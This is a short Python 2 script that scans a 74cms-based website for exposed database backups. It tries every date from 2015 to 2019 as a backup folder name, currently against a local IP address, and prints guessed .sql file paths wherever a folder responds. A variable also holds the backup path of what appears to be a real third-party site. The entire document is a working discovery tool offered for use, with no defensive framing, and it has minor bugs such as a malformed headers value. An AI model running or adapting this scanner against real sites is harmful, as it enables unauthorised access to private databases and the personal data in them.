import requests

year = ['2015','2016','2017','2018','2019']
month = ['01','02','03','04','05','06','07','08','09','10','11','12']
day = ['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31']
url = "http://www.xunpao123.com/51jishiwang/data/backup/"
tezheng = "Copyright © 2016 74cms.com"
headers = {"User-Agent"," Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"}

def main():
    url = "http://192.168.137.130/upload/data/backup/database/"
    for ye in year:
        for mo in month:
            for da in day:
                tim = ye+mo+da
                url_0 = url+tim+"_1/"
                
                
                html = requests.get(url_0)
                if html.status_code==200:
                    print url_0+tim+"_1_1.sql"
                else:
                    pass
                
              
                
                
                

if __name__ == '__main__':
	
    main()
